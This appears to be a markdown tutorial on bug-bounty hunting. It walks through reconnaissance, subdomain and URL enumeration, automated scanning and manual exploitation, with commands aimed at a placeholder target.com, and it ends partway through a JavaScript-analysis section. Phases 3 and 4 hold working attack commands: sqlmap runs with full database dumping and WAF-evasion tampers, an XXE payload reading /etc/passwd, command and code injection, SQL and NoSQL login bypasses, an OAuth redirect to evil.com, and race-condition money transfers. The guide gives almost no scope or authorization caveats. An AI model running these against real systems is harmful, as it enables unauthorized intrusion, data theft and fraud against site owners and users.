# 🔥 COMPLETE BUG HUNTING WORKFLOW (A to Z) 🔥
## Beginner to Elite Level - Step by Step Guide

---

## 📋 **TABLE OF CONTENTS**
1. [Pre-Hunting Setup](#pre-hunting-setup)
2. [Phase 1: Reconnaissance & Information Gathering](#phase-1-reconnaissance--information-gathering)
3. [Phase 2: Asset Discovery & Enumeration](#phase-2-asset-discovery--enumeration)
4. [Phase 3: Vulnerability Scanning & Testing](#phase-3-vulnerability-scanning--testing)
5. [Phase 4: Manual Testing & Exploitation](#phase-4-manual-testing--exploitation)
6. [Phase 5: Advanced Techniques](#phase-5-advanced-techniques)
7. [Phase 6: Reporting & Documentation](#phase-6-reporting--documentation)
8. [Automation Scripts](#automation-scripts)
9. [Tools Installation Guide](#tools-installation-guide)
10. [Detailed Command Explanations](#detailed-command-explanations)
11. [Real-World Examples](#real-world-examples)
12. [Troubleshooting Guide](#troubleshooting-guide)

---

## 🛠️ **PRE-HUNTING SETUP**

### **🎯 Why This Phase is Important:**
Before starting any bug hunting, proper setup ensures you have all necessary tools and organized workspace. This prevents confusion and saves time during actual testing.

### **Essential Tools Installation**
```bash
# Create workspace - This organizes all your findings in one place
mkdir ~/bug_hunting && cd ~/bug_hunting
mkdir {recon,scans,exploits,reports,tools}

# Install Go tools - These are fast, efficient tools written in Go language
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest  # Subdomain discovery
go install -v github.com/tomnomnom/assetfinder@latest                        # Asset discovery
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest            # HTTP toolkit
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest       # Vulnerability scanner
go install -v github.com/projectdiscovery/katana/cmd/katana@latest          # Web crawler
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest         # Port scanner
go install -v github.com/hahwul/dalfox/v2@latest                            # XSS scanner
go install -v github.com/tomnomnom/waybackurls@latest                       # Wayback machine URLs
go install -v github.com/tomnomnom/qsreplace@latest                         # Query string replacer
go install -v github.com/tomnomnom/anew@latest                              # Append new lines only
go install -v github.com/lc/gau/v2/cmd/gau@latest                           # Get All URLs
go install -v github.com/sensepost/gowitness@latest                         # Screenshot tool

# Install Python tools - These are powerful Python-based security tools
pip3 install sqlmap dirsearch arjun paramspider

# Install other tools - Traditional but essential tools
sudo apt update && sudo apt install -y gobuster ffuf amass nmap masscan
```

### **🔍 Command Explanations:**
- **mkdir**: Creates directories to organize your work
- **go install**: Downloads and installs Go-based tools
- **pip3 install**: Installs Python packages
- **apt install**: Installs system packages on Debian/Ubuntu

### **Directory Structure Setup**
```bash
# Create organized directory structure - This helps you find results quickly
mkdir -p ~/bug_hunting/{targets,recon/{subdomains,urls,js,secrets},scans/{ports,vulns},exploits,reports}
```

**📁 Directory Purpose:**
- `targets/`: Store target information
- `recon/subdomains/`: All subdomain discovery results
- `recon/urls/`: All URL collection results
- `recon/js/`: JavaScript file analysis
- `recon/secrets/`: Found secrets and API keys
- `scans/ports/`: Port scanning results
- `scans/vulns/`: Vulnerability scan results
- `exploits/`: Proof of concept exploits
- `reports/`: Final reports and documentation

---

## 🔍 **PHASE 1: RECONNAISSANCE & INFORMATION GATHERING**

### **🎯 Why This Phase is Critical:**
Reconnaissance is the foundation of successful bug hunting. The more information you gather about your target, the better your chances of finding vulnerabilities. This phase helps you understand the target's infrastructure, technology stack, and potential attack surface.

### **1.1 Target Information Gathering (OSINT)**

#### **🔰 Beginner Level:**
```bash
# Basic domain information - Understanding your target's basic details
whois target.com | tee recon/whois.txt
# ↳ EXPLANATION: whois gives you domain registration details, nameservers, registrar info
# ↳ WHY IMPORTANT: Reveals contact info, registration dates, and sometimes admin details

dig target.com | tee recon/dns.txt
# ↳ EXPLANATION: dig queries DNS records to show IP addresses and DNS configuration
# ↳ WHY IMPORTANT: Shows where the domain points, mail servers, and DNS setup

nslookup target.com | tee -a recon/dns.txt
# ↳ EXPLANATION: Another DNS lookup tool, sometimes reveals different information than dig
# ↳ WHY IMPORTANT: Cross-verification of DNS information

# Check for basic info from Certificate Transparency logs
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u | tee recon/crt_sh.txt
# ↳ EXPLANATION: Certificate Transparency logs show all SSL certificates issued for a domain
# ↳ WHY IMPORTANT: Reveals subdomains that might not be publicly linked
```

#### **🚀 Intermediate Level:**
```bash
# Advanced OSINT gathering - Deeper intelligence collection
amass intel -d target.com -whois | tee recon/amass_intel.txt
# ↳ EXPLANATION: amass intel gathers intelligence about the target organization
# ↳ WHY IMPORTANT: Finds related domains, ASNs, and organizational information

amass intel -d target.com -src | tee -a recon/amass_intel.txt
# ↳ EXPLANATION: Shows which data sources provided information about the target
# ↳ WHY IMPORTANT: Helps you understand data reliability and coverage

# Social media and employee enumeration
theHarvester -d target.com -l 500 -b all | tee recon/theharvester.txt
# ↳ EXPLANATION: Searches multiple sources for emails, names, subdomains, IPs
# ↳ WHY IMPORTANT: Social engineering opportunities and additional attack surface

# ASN enumeration - Finding all IP ranges owned by the organization
amass intel -asn [ASN_NUMBER] | tee recon/asn_domains.txt
# ↳ EXPLANATION: ASN (Autonomous System Number) shows all IP ranges owned by organization
# ↳ WHY IMPORTANT: Discovers additional domains and infrastructure
```

#### **⚡ Elite Level:**
```bash
# Advanced ASN and IP range discovery
curl -s "https://api.hackertarget.com/aslookup/?q=target.com" | tee recon/asn_info.txt
# ↳ EXPLANATION: API call to get ASN information for the target
# ↳ WHY IMPORTANT: Automated way to get ASN data for further enumeration

curl -s "https://api.hackertarget.com/reverseiplookup/?q=target.com" | tee recon/reverse_ip.txt
# ↳ EXPLANATION: Reverse IP lookup to find other domains on same server
# ↳ WHY IMPORTANT: Shared hosting might reveal related applications

# GitHub reconnaissance - Finding leaked credentials and sensitive information
python3 ~/tools/GitHound/main.py --subdomain-file recon/subdomains.txt --dig-files --dig-commits | tee recon/github_recon.txt
# ↳ EXPLANATION: Searches GitHub for leaked credentials, API keys, and sensitive files
# ↳ WHY IMPORTANT: Developers often accidentally commit sensitive information

# Certificate transparency advanced search
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee recon/crt_advanced.txt
# ↳ EXPLANATION: Wildcard search in CT logs to find all subdomains
# ↳ WHY IMPORTANT: More comprehensive subdomain discovery than basic search
```

---

## 🎯 **PHASE 2: ASSET DISCOVERY & ENUMERATION**

### **🎯 Why This Phase is Essential:**
Asset discovery helps you map the entire attack surface. Every subdomain, URL, and endpoint is a potential entry point. The more assets you discover, the more opportunities you have to find vulnerabilities.

### **2.1 Subdomain Enumeration**

#### **🔰 Beginner Level:**
```bash
# Basic subdomain discovery - Finding subdomains using passive methods
subfinder -d target.com -all -silent | tee recon/subdomains/subfinder.txt
# ↳ EXPLANATION: subfinder uses multiple data sources to find subdomains passively
# ↳ WHY IMPORTANT: Subdomains often have different security configurations
# ↳ SOURCES USED: Certificate transparency, DNS databases, search engines

assetfinder --subs-only target.com | tee recon/subdomains/assetfinder.txt
# ↳ EXPLANATION: assetfinder finds subdomains from various online sources
# ↳ WHY IMPORTANT: Different tool, different sources = more comprehensive results
# ↳ ADVANTAGE: Fast and lightweight tool
```

#### **🚀 Intermediate Level:**
```bash
# Multiple source subdomain enumeration - Combining results from different tools
subfinder -d target.com -all -silent | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: subfinder with all sources enabled for maximum coverage
# ↳ anew: Only adds new/unique lines to avoid duplicates

assetfinder --subs-only target.com | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: Adding assetfinder results to the same file
# ↳ WHY COMBINE: Each tool has different data sources

amass enum -passive -d target.com | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: amass passive enumeration (no direct DNS queries to target)
# ↳ WHY PASSIVE: Stealthier approach, less likely to be detected

findomain -t target.com -q | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: Another subdomain enumeration tool with different sources
# ↳ -q: Quiet mode for clean output

# Certificate transparency - Mining SSL certificate logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: Direct API call to certificate transparency logs
# ↳ sed 's/\*\.//g': Removes wildcard characters from results
# ↳ WHY IMPORTANT: CT logs are comprehensive and updated in real-time
```

#### **⚡ Elite Level:**
```bash
# Advanced subdomain enumeration with multiple techniques
echo "target.com" | subfinder -all -silent | anew recon/subdomains/all_subs.txt
echo "target.com" | assetfinder --subs-only | anew recon/subdomains/all_subs.txt
amass enum -active -d target.com -brute -w ~/SecLists/Discovery/DNS/fierce-hostlist.txt | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: Active enumeration with DNS bruteforcing
# ↳ -active: Makes direct DNS queries (more thorough but detectable)
# ↳ -brute: Bruteforce subdomains using wordlist
# ↳ WHY RISKY: Active scanning can be detected by target

# DNS bruteforcing - Finding subdomains not in public records
puredns bruteforce ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt target.com --resolvers ~/resolvers.txt | anew recon/subdomains/all_subs.txt
# ↳ EXPLANATION: Pure DNS bruteforcing with custom resolvers
# ↳ WHY EFFECTIVE: Finds subdomains that aren't in public databases
# ↳ RESOLVERS: Using multiple DNS servers for faster resolution

# Subdomain permutation - Creating variations of found subdomains
python3 ~/tools/altdns/altdns.py -i recon/subdomains/all_subs.txt -o recon/subdomains/altdns.txt -w ~/SecLists/Discovery/DNS/altdns-words.txt
# ↳ EXPLANATION: Generates permutations of existing subdomains
# ↳ EXAMPLE: If you find 'api.target.com', it tries 'api-dev.target.com', 'api-test.target.com'
# ↳ WHY EFFECTIVE: Developers often use predictable naming patterns
```

### **2.2 Live Host Discovery**

#### **🔰 Beginner Level:**
```bash
# Basic alive check - Finding which subdomains are actually responding
cat recon/subdomains/all_subs.txt | httpx -silent -status-code -title | tee recon/alive_hosts.txt
# ↳ EXPLANATION: httpx checks if subdomains are alive and responding to HTTP requests
# ↳ -silent: Reduces output noise
# ↳ -status-code: Shows HTTP response codes (200, 404, 500, etc.)
# ↳ -title: Extracts page titles for quick identification
# ↳ WHY IMPORTANT: No point testing dead subdomains
```

#### **🚀 Intermediate Level:**
```bash
# Advanced alive check with more details
cat recon/subdomains/all_subs.txt | httpx -silent -status-code -title -tech-detect -server -content-length | tee recon/alive_detailed.txt
# ↳ EXPLANATION: More comprehensive alive check with additional information
# ↳ -tech-detect: Identifies technologies used (WordPress, Apache, etc.)
# ↳ -server: Shows server header information
# ↳ -content-length: Shows response size
# ↳ WHY USEFUL: Helps prioritize targets based on technology stack

# Extract only URLs for further processing
cat recon/alive_detailed.txt | cut -d ' ' -f1 | tee recon/alive_urls.txt
# ↳ EXPLANATION: Extracts just the URLs from the detailed output
# ↳ cut -d ' ' -f1: Cuts the first field (URL) from space-separated output
# ↳ WHY NEEDED: Clean URL list for next phase tools
```

#### **⚡ Elite Level:**
```bash
# Comprehensive alive check with advanced fingerprinting
cat recon/subdomains/all_subs.txt | httpx -silent -status-code -title -tech-detect -server -content-length -favicon -jarm -asn | tee recon/alive_comprehensive.txt
# ↳ EXPLANATION: Maximum information gathering from alive hosts
# ↳ -favicon: Extracts favicon hashes for technology identification
# ↳ -jarm: TLS fingerprinting for server identification
# ↳ -asn: Shows Autonomous System Number information
# ↳ WHY COMPREHENSIVE: More data points for better target analysis

# Take screenshots for visual reconnaissance
gowitness file -f recon/alive_urls.txt -P recon/screenshots/ --disable-logging
# ↳ EXPLANATION: Takes screenshots of all alive websites
# ↳ -P: Output directory for screenshots
# ↳ --disable-logging: Reduces output noise
# ↳ WHY USEFUL: Visual inspection can reveal interesting applications

# Port scanning on alive hosts
naabu -list recon/alive_urls.txt -top-ports 1000 -silent | tee recon/open_ports.txt
# ↳ EXPLANATION: Scans top 1000 ports on alive hosts
# ↳ -top-ports: Scans most commonly used ports
# ↳ WHY IMPORTANT: Open ports reveal additional services and attack surface
```

### **2.3 URL Discovery & Crawling**

#### **🔰 Beginner Level:**
```bash
# Basic URL collection - Finding historical URLs
cat recon/alive_urls.txt | waybackurls | tee recon/urls/wayback.txt
# ↳ EXPLANATION: waybackurls fetches URLs from Wayback Machine archives
# ↳ WHY IMPORTANT: Old URLs might still work and have vulnerabilities
# ↳ ADVANTAGE: Finds endpoints that might not be linked anymore

cat recon/alive_urls.txt | gau | tee recon/urls/gau.txt
# ↳ EXPLANATION: gau (Get All URLs) fetches URLs from multiple sources
# ↳ SOURCES: Wayback Machine, Common Crawl, Alien Vault OTX
# ↳ WHY USEFUL: More comprehensive than just Wayback Machine
```

#### **🚀 Intermediate Level:**
```bash
# Advanced URL collection from multiple sources
cat recon/alive_urls.txt | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault | anew recon/urls/all_urls.txt
# ↳ EXPLANATION: katana crawls websites and fetches URLs from passive sources
# ↳ -d 5: Crawl depth of 5 levels
# ↳ -ps: Enable passive sources
# ↳ -pss: Specify passive sources to use
# ↳ WHY EFFECTIVE: Combines active crawling with passive collection

cat recon/alive_urls.txt | waybackurls | anew recon/urls/all_urls.txt
# ↳ EXPLANATION: Adding Wayback Machine URLs to comprehensive list

cat recon/alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,json,css,js,webp,woff,woff2,eot,ttf,otf,mp4,txt | anew recon/urls/all_urls.txt
# ↳ EXPLANATION: gau with blacklist to exclude non-interesting file types
# ↳ --blacklist: Excludes static files that rarely have vulnerabilities
# ↳ WHY FILTER: Focuses on potentially vulnerable endpoints
```

#### **⚡ Elite Level:**
```bash
# Comprehensive URL discovery with multiple sources and techniques
echo "target.com" | gau --subs --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,json,css,js,webp,woff,woff2,eot,ttf,otf,mp4,txt | anew recon/urls/all_urls.txt
# ↳ EXPLANATION: gau with subdomain enumeration enabled
# ↳ --subs: Also fetch URLs for discovered subdomains
# ↳ WHY COMPREHENSIVE: Gets URLs for entire domain infrastructure

echo "target.com" | waybackurls | anew recon/urls/all_urls.txt
cat recon/alive_urls.txt | katana -silent -d 10 -ps -pss waybackarchive,commoncrawl,alienvault,otx,threatcrowd | anew recon/urls/all_urls.txt
# ↳ EXPLANATION: Maximum depth crawling with all passive sources
# ↳ -d 10: Deeper crawling for more comprehensive coverage
# ↳ MORE SOURCES: OTX and ThreatCrowd for additional URL discovery

# Spider with custom headers and authentication bypass attempts
for url in $(cat recon/alive_urls.txt); do
    katana -u $url -d 5 -silent -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" | anew recon/urls/all_urls.txt
done
# ↳ EXPLANATION: Custom headers to bypass basic restrictions
# ↳ X-Forwarded-For: 127.0.0.1: Might bypass IP-based restrictions
# ↳ WHY USEFUL: Some endpoints only accessible with specific headers

# Extract different types of URLs for targeted testing
cat recon/urls/all_urls.txt | grep "=" | anew recon/urls/params.txt
# ↳ EXPLANATION: URLs with parameters (potential injection points)
# ↳ WHY IMPORTANT: Parameters are primary targets for injection attacks

cat recon/urls/all_urls.txt | grep -E "\.(js|json)" | anew recon/urls/js_files.txt
# ↳ EXPLANATION: JavaScript and JSON files
# ↳ WHY IMPORTANT: JS files often contain API endpoints and sensitive information
```

---

## 🔍 **PHASE 3: VULNERABILITY SCANNING & TESTING**

### **🎯 Why This Phase is Crucial:**
This phase uses automated tools to quickly identify common vulnerabilities across your discovered assets. While manual testing is important, automated scanning helps you cover a large attack surface efficiently and identifies low-hanging fruit.

### **3.1 Automated Vulnerability Scanning**

#### **🔰 Beginner Level:**
```bash
# Basic Nuclei scan - Automated vulnerability detection
nuclei -list recon/alive_urls.txt -t ~/nuclei-templates/ -o scans/nuclei_basic.txt
# ↳ EXPLANATION: nuclei runs vulnerability templates against all alive URLs
# ↳ -t ~/nuclei-templates/: Uses all available templates
# ↳ WHY EFFECTIVE: Covers hundreds of vulnerability types automatically
# ↳ OUTPUT: Detailed vulnerability reports with severity levels

# Basic XSS testing - Cross-Site Scripting detection
cat recon/urls/params.txt | dalfox pipe --silence --no-spinner -o scans/xss_results.txt
# ↳ EXPLANATION: dalfox tests all parameterized URLs for XSS vulnerabilities
# ↳ pipe: Reads URLs from stdin (piped input)
# ↳ --silence: Reduces output noise
# ↳ --no-spinner: Disables progress spinner for cleaner logs
# ↳ WHY IMPORTANT: XSS is one of the most common web vulnerabilities
```

#### **🚀 Intermediate Level:**
```bash
# Advanced Nuclei scanning with severity filtering
nuclei -list recon/alive_urls.txt -t ~/nuclei-templates/ -severity critical,high,medium -o scans/nuclei_detailed.txt
# ↳ EXPLANATION: Focuses on higher severity vulnerabilities first
# ↳ -severity: Filters templates by severity level
# ↳ WHY FILTER: Prioritizes critical findings over informational ones

nuclei -list recon/alive_urls.txt -t ~/nuclei-templates/cves/ -o scans/nuclei_cves.txt
# ↳ EXPLANATION: Specifically tests for known CVEs (Common Vulnerabilities and Exposures)
# ↳ WHY IMPORTANT: CVEs often have public exploits available

nuclei -list recon/alive_urls.txt -t ~/nuclei-templates/exposures/ -o scans/nuclei_exposures.txt
# ↳ EXPLANATION: Tests for information disclosure and exposure issues
# ↳ WHY IMPORTANT: Exposed information can lead to further attacks

# Advanced XSS testing with detailed output
cat recon/urls/params.txt | dalfox pipe --silence --no-spinner --skip-bav --skip-greedy --format json -o scans/xss_detailed.json
# ↳ EXPLANATION: More thorough XSS testing with JSON output
# ↳ --skip-bav: Skips basic XSS payloads for faster scanning
# ↳ --skip-greedy: Reduces false positives
# ↳ --format json: Structured output for easier parsing
```

#### **⚡ Elite Level:**
```bash
# Comprehensive vulnerability scanning with optimization
nuclei -list recon/alive_urls.txt -t ~/nuclei-templates/ -severity critical,high,medium,low -c 50 -rl 150 -timeout 10 -retries 2 -o scans/nuclei_comprehensive.txt
# ↳ EXPLANATION: Maximum coverage with performance optimization
# ↳ -c 50: 50 concurrent threads for faster scanning
# ↳ -rl 150: Rate limit of 150 requests per second
# ↳ -timeout 10: 10 second timeout per request
# ↳ -retries 2: Retry failed requests twice
# ↳ WHY OPTIMIZE: Balance between speed and accuracy

# Custom Nuclei templates for specific targets
nuclei -list recon/alive_urls.txt -t ~/custom-templates/ -o scans/nuclei_custom.txt
# ↳ EXPLANATION: Uses custom templates tailored for specific technologies
# ↳ WHY CUSTOM: Generic templates might miss application-specific vulnerabilities

# Advanced XSS with custom payloads
cat recon/urls/params.txt | dalfox pipe --silence --no-spinner --skip-bav --custom-payload ~/xss-payloads.txt --format json -o scans/xss_advanced.json
# ↳ EXPLANATION: Uses custom XSS payloads for specific bypass techniques
# ↳ --custom-payload: File containing specialized XSS payloads
# ↳ WHY CUSTOM: Bypasses WAFs and filters that block common payloads
```

### **3.2 SQL Injection Testing**

#### **🔰 Beginner Level:**
```bash
# Basic SQLi testing - Automated SQL injection detection
sqlmap -m recon/urls/params.txt --batch --level=2 --risk=2 --random-agent | tee scans/sqlmap_basic.txt
# ↳ EXPLANATION: sqlmap tests all parameterized URLs for SQL injection
# ↳ -m: Reads URLs from file
# ↳ --batch: Non-interactive mode (uses default options)
# ↳ --level=2: Test level (1-5, higher = more tests)
# ↳ --risk=2: Risk level (1-3, higher = more aggressive)
# ↳ --random-agent: Uses random User-Agent headers
# ↳ WHY IMPORTANT: SQL injection can lead to complete database compromise
```

#### **🚀 Intermediate Level:**
```bash
# Advanced SQLi testing with more techniques
sqlmap -m recon/urls/params.txt --batch --level=3 --risk=3 --random-agent --threads=10 --technique=BEUSTQ | tee scans/sqlmap_advanced.txt
# ↳ EXPLANATION: More comprehensive SQL injection testing
# ↳ --level=3: More thorough testing (includes more parameters)
# ↳ --risk=3: Maximum risk level (includes UPDATE/DELETE queries)
# ↳ --threads=10: 10 concurrent threads for faster testing
# ↳ --technique=BEUSTQ: All SQL injection techniques
#   B: Boolean-based blind
#   E: Error-based
#   U: Union query-based
#   S: Stacked queries
#   T: Time-based blind
#   Q: Inline queries

# Test specific parameters individually
for url in $(cat recon/urls/params.txt); do
    sqlmap -u "$url" --batch --level=2 --risk=2 --random-agent --dbs --dump-all | tee -a scans/sqlmap_detailed.txt
done
# ↳ EXPLANATION: Individual testing of each URL for more thorough analysis
# ↳ --dbs: Enumerate databases if injection is found
# ↳ --dump-all: Dump all database contents (use carefully!)
# ↳ WHY INDIVIDUAL: Some injections might be missed in batch mode
```

#### **⚡ Elite Level:**
```bash
# Comprehensive SQLi testing with evasion techniques
sqlmap -m recon/urls/params.txt --batch --level=5 --risk=3 --random-agent --threads=10 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase | tee scans/sqlmap_elite.txt
# ↳ EXPLANATION: Maximum testing with WAF bypass techniques
# ↳ --level=5: Maximum test level (tests all parameters and headers)
# ↳ --tamper: WAF bypass techniques
#   space2comment: Replaces spaces with comments
#   charencode: Character encoding
#   randomcase: Random case changes
# ↳ WHY TAMPER: Bypasses Web Application Firewalls

# Test with custom headers and authentication bypass
for url in $(cat recon/urls/params.txt); do
    sqlmap -u "$url" --batch --level=3 --risk=3 --headers="X-Forwarded-For: 127.0.0.1" --user-agent="Mozilla/5.0" --dbs --dump-all | tee -a scans/sqlmap_custom.txt
done
# ↳ EXPLANATION: Custom headers to bypass IP restrictions
# ↳ --headers: Custom HTTP headers
# ↳ X-Forwarded-For: 127.0.0.1: Might bypass IP-based restrictions
# ↳ WHY CUSTOM: Some applications have different behavior with specific headers
```

### **3.3 Directory & File Discovery**

#### **🔰 Beginner Level:**
```bash
# Basic directory bruteforcing - Finding hidden directories and files
for url in $(cat recon/alive_urls.txt); do
    gobuster dir -u $url -w ~/SecLists/Discovery/Web-Content/common.txt -t 50 -x php,txt,json,xml | tee -a scans/gobuster_basic.txt
done
# ↳ EXPLANATION: gobuster bruteforces directories using common wordlist
# ↳ -w: Wordlist file containing directory/file names to try
# ↳ -t 50: 50 concurrent threads
# ↳ -x: File extensions to append to wordlist entries
# ↳ WHY IMPORTANT: Hidden directories often contain sensitive information
```

#### **🚀 Intermediate Level:**
```bash
# Advanced directory discovery with larger wordlists
for url in $(cat recon/alive_urls.txt); do
    gobuster dir -u $url -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,txt,json,xml,js,html,asp,aspx,jsp | tee -a scans/gobuster_advanced.txt
done
# ↳ EXPLANATION: Larger wordlist with more file extensions
# ↳ directory-list-2.3-medium.txt: More comprehensive wordlist
# ↳ MORE EXTENSIONS: Covers more web technologies
# ↳ -t 100: More threads for faster scanning

# FFUF for parameter discovery - Finding hidden parameters
for url in $(cat recon/alive_urls.txt); do
    ffuf -u "$url/FUZZ" -w ~/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc 200,204,301,302,307,401,403 | tee -a scans/ffuf_dirs.txt
done
# ↳ EXPLANATION: ffuf (Fuzz Faster U Fool) for fuzzing directories
# ↳ FUZZ: Placeholder that gets replaced with wordlist entries
# ↳ -mc: Match HTTP status codes (what to consider as findings)
# ↳ WHY FFUF: Often faster than gobuster and more flexible
```

#### **⚡ Elite Level:**
```bash
# Comprehensive discovery with multiple wordlists and techniques
for url in $(cat recon/alive_urls.txt); do
    # Directory discovery with comprehensive wor
    gobuster dir -u $url -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x php,txt,json,xml,js,html,asp,aspx,jsp,bak,old,zip,tar,gz | tee -a scans/gobuster_comprehensive.txt
    # ↳ EXPLANATION: Maximum wordlist with backup file extensions
    # ↳ directory-list-2.3-big.txt: Largest wordlist for maximum coverage
    # ↳ BACKUP EXTENSIONS: .bak, .old often contain sensitive information
    
    # Parameter discovery
    ffuf -u "$url/FUZZ" -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,204,301,302,307,401,403,500 | tee -a scans/ffuf_params.txt
    # ↳ EXPLANATION: Discovers hidden parameters that might accept input
    # ↳ burp-parameter-names.txt: Common parameter names from Burp Suite
    # ↳ WHY PARAMETERS: Hidden parameters often have less security validation
    
    # Virtual host discovery
    ffuf -u $url -H "Host: FUZZ.$(echo $url | cut -d'/' -f3)" -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,204,301,302,307,401,403 | tee -a scans/ffuf_vhosts.txt
done
# ↳ EXPLANATION: Discovers virtual hosts on the same IP
# ↳ -H "Host: FUZZ...": Changes the Host header to test virtual hosts
# ↳ WHY VHOSTS: Same server might host multiple applications
```

---

## 🎯 **PHASE 4: MANUAL TESTING & EXPLOITATION**

### **4.1 Authentication & Authorization Testing**

#### **🔰 Beginner Level:**
```bash
# Basic authentication bypass attempts
curl -X POST "https://target.com/login" -d "username=admin&password=admin" -H "Content-Type: application/x-www-form-urlencoded" | tee exploits/auth_basic.txt
```

#### **🚀 Intermediate Level:**
```bash
# Advanced authentication testing
# SQL injection in login
curl -X POST "https://target.com/login" -d "username=admin'--&password=anything" -H "Content-Type: application/x-www-form-urlencoded" | tee exploits/auth_sqli.txt

# NoSQL injection
curl -X POST "https://target.com/login" -d "username[$ne]=null&password[$ne]=null" -H "Content-Type: application/json" | tee exploits/auth_nosqli.txt
```

#### **⚡ Elite Level:**
```bash
# Comprehensive authentication bypass techniques
# JWT token manipulation
python3 ~/tools/jwt_tool/jwt_tool.py -t "JWT_TOKEN_HERE" -C -d ~/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# OAuth vulnerabilities
curl -X GET "https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com&response_type=code&scope=read" | tee exploits/oauth_test.txt

# SAML testing
python3 ~/tools/SAMLRaider/saml_raider.py -u "https://target.com/saml/sso" -f saml_request.xml | tee exploits/saml_test.txt
```

### **4.2 Business Logic Testing**

#### **🔰 Beginner Level:**
```bash
# Basic IDOR testing
curl -H "Authorization: Bearer TOKEN" "https://target.com/api/user/123" | tee exploits/idor_basic.txt
curl -H "Authorization: Bearer TOKEN" "https://target.com/api/user/124" | tee -a exploits/idor_basic.txt
```

#### **🚀 Intermediate Level:**
```bash
# Advanced IDOR and privilege escalation
for i in {1..1000}; do
    curl -s -H "Authorization: Bearer TOKEN" "https://target.com/api/user/$i" | grep -v "unauthorized\|forbidden" | tee -a exploits/idor_advanced.txt
done

# Race condition testing
for i in {1..10}; do
    curl -X POST "https://target.com/api/transfer" -d "amount=1000&to_account=attacker" -H "Authorization: Bearer TOKEN" &
done
wait
```

#### **⚡ Elite Level:**
```bash
# Comprehensive business logic testing
# Price manipulation
curl -X POST "https://target.com/api/purchase" -d "item_id=123&price=-100&quantity=1" -H "Content-Type: application/json" -H "Authorization: Bearer TOKEN" | tee exploits/price_manipulation.txt

# Workflow bypass
curl -X POST "https://target.com/api/approve" -d "request_id=123&status=approved" -H "Authorization: Bearer TOKEN" | tee exploits/workflow_bypass.txt

# Time-based attacks
python3 -c "
import requests
import time
for i in range(100):
    r = requests.post('https://target.com/api/action', json={'data': 'test'}, headers={'Authorization': 'Bearer TOKEN'})
    print(f'Request {i}: {r.status_code}')
    time.sleep(0.1)
" | tee exploits/timing_attack.txt
```

### **4.3 Advanced Injection Testing**

#### **🔰 Beginner Level:**
```bash
# Basic command injection
curl "https://target.com/ping?host=127.0.0.1;id" | tee exploits/cmd_injection_basic.txt
```

#### **🚀 Intermediate Level:**
```bash
# Advanced injection techniques
# LDAP injection
curl "https://target.com/search?user=*)(uid=*))(|(uid=*" | tee exploits/ldap_injection.txt

# XML injection
curl -X POST "https://target.com/xml" -d "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>" -H "Content-Type: application/xml" | tee exploits/xml_injection.txt
```

#### **⚡ Elite Level:**
```bash
# Comprehensive injection testing
# Server-Side Template Injection (SSTI)
curl "https://target.com/template?name={{7*7}}" | tee exploits/ssti_test.txt
curl "https://target.com/template?name={{config}}" | tee -a exploits/ssti_test.txt

# Expression Language Injection
curl "https://target.com/el?expr=\${7*7}" | tee exploits/el_injection.txt

# Code injection
curl "https://target.com/eval?code=system('id')" | tee exploits/code_injection.txt
```

---

## ⚡ **PHASE 5: ADVANCED TECHNIQUES**

### **5.1 JavaScript Analysis & DOM-based Vulnerabilities**

#### **🔰 Beginner Level:**
```bash
# Basic JS file analysis
cat recon/urls/js_files.txt | while read url; do
    curl -s "$url" | grep -E "(api_key|token|secret|password)" | tee -a scans/js_secrets.txt
done
```

#### **🚀 Intermediate Level:**
```bash
# Advanced JS analysis
cat recon/urls/js_files.txt | while read url; do
    echo "=== Analyzing: $url ===" | tee -a scans/js_analysis.txt
    curl -s "$url" | python3 ~/tools/LinkFinder/linkfinder.py -i stdin -o cli | tee -a scans/js_analysis.txt
    curl -s "$url" | grep -oP '(?<=api_key=)[^&\s]+|(?<=token=)[^&\s]+|(?<=secret=)[^&\s]+' | tee -a scans/js_secrets.txt
done
```

#### **⚡ Elite Level:**
```bash
# Comprehensive JS analysis with multiple tools
cat recon/urls/js_files.txt | while read url; do
    echo "=== Comprehensive Analysis: $url ===" | tee -a scans/js_comprehensive.txt
    
    # Extract endpoints
    curl -s "$url" | python3 ~/tools/LinkFinder/linkfinder.py -i stdin -o cli | tee -a scans/js_endpoints.txt
    
    # Extract secrets with regex
    curl -s "$url" | grep -oE '(api_key|apikey|api-key|secret|token|password|pwd|auth|authorization|bearer)["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}' | tee -a scans/js_secrets_advanced.txt
    
    # DOM XSS analysis
    curl -s "$url" | grep -E "(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval)" | tee -a scans/js_dom_sinks.txt
    
    # Extract URLs and parameters
    curl -s "$url" | grep -oE 'https?://[^"'\''<>\s]+' | tee -a scans/js_urls.txt
done

